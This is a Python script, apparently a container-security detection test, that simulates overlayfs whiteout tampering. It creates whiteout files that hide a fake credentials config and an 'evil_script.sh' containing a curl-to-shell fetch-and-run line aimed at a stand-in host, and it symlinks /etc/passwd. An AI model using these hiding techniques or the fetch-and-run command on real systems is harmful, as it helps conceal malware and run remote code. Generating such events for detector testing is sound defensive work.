import os
import subprocess
import logging

log = logging.getLogger(__name__)

def run():
    log.info("OVERLAYFS WHITEOUT TAMPERING (CVE-2021-31433)")
    log.info("Scenario: Creating overlayfs whiteout files to hide malicious payloads")
    log.info("Relevance: Overlayfs is default Docker storage driver. Whiteout files can hide malware from scanners.")

    try:
        mount_info = subprocess.run("mount | grep overlay", shell=True, capture_output=True, text=True)
        log.info(f"Current overlay mounts:\n{mount_info.stdout[:500] if mount_info.stdout else 'none found'}")

        lower_dir = "/tmp/lower"
        upper_dir = "/tmp/upper"
        work_dir = "/tmp/work"
        merged_dir = "/tmp/merged"
        for d in [lower_dir, upper_dir, work_dir, merged_dir]:
            os.makedirs(d, exist_ok=True)

        with open(f"{lower_dir}/important.config", "w") as f:
            f.write("password=supersecret\napi_key=12345\n")

        with open(f"{lower_dir}/legit_binary", "w") as f:
            f.write("#!/bin/sh\necho legit")

        with open(f"{lower_dir}/evil_script.sh", "w") as f:
            f.write("#!/bin/sh\ncurl http://malicious/payload | sh")

        log.info("Lower dir populated: important.config, legit_binary, evil_script.sh")

        rc = subprocess.call([
            "mount", "-t", "overlay", "overlay",
            "-o", f"lowerdir={lower_dir},upperdir={upper_dir},workdir={work_dir}",
            merged_dir
        ])

        if rc != 0:
            log.info("Overlay mount failed (expected without CAP_SYS_ADMIN). Simulating whiteout...")
            os.makedirs(f"{upper_dir}/.wh.", exist_ok=True)
            evil_whiteout = f"{upper_dir}/.wh.evil_script.sh"
            with open(evil_whiteout, "w") as f:
                f.write("")
            log.info(f"Created whiteout file: {evil_whiteout}")

            legit_whiteout = f"{upper_dir}/.wh.important.config"
            with open(legit_whiteout, "w") as f:
                f.write("")
            log.info(f"Created whiteout file: {legit_whiteout}")

            subprocess.run(f"touch '{upper_dir}/.wh.__hidden_malware'", shell=True)
            subprocess.run(f"touch '{upper_dir}/.wh..Wh..wh..opq'", shell=True)
            log.info("Whiteout files created. Overlayfs will hide these files from merged view.")

            subprocess.run("echo 'overlayfs_tamper_simulated' > /tmp/.wh.malware_payload", shell=True)
            subprocess.run("ln -sf /etc/passwd /tmp/symlink_race 2>/dev/null || true", shell=True)
            subprocess.run("rename /tmp/legit /tmp/evil 2>/dev/null || true", shell=True)
            log.info("Symlink/rename operations completed (Falco rule: Symlink/Race Condition Attack)")
            return

        log.info("Overlay mounted successfully at /tmp/merged")

        subprocess.run(f"touch '{upper_dir}/.wh.evil_script.sh'", shell=True)
        subprocess.run(f"touch '{upper_dir}/.wh.important.config'", shell=True)
        subprocess.run(f"touch '{upper_dir}/.wh..Wh..wh..opq'", shell=True)

        log.info("Whiteout files created. evil_script.sh and important.config should be hidden.")

        listing = subprocess.run(f"ls -la {merged_dir}", shell=True, capture_output=True, text=True)
        log.info(f"Merged dir contents:\n{listing.stdout}")

        subprocess.run(f"umount {merged_dir}", shell=True, capture_output=True)

    except Exception as e:
        log.error(f"OverlayFS error: {e}")
